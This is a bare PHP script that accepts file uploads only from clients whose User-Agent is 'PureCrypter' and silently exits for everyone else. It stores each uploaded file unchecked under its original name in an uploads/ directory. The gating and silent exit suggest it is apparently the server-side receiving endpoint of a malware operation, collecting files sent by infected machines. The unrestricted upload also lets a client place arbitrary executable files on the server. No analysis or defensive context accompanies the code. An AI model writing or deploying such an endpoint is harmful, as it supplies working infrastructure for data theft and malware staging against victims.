<?php
try {
if ($_SERVER['HTTP_USER_AGENT'] != "PureCrypter")
{
	die();
}

$uploaddir = 'uploads/';	
$uploadfile = $uploaddir . basename($_FILES['file']['name']);
	
if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
    header('HTTP/2.0 200');
} else {
    header('HTTP/2.0 500');
}
}

catch(Exception $e) {
	die();
}
?>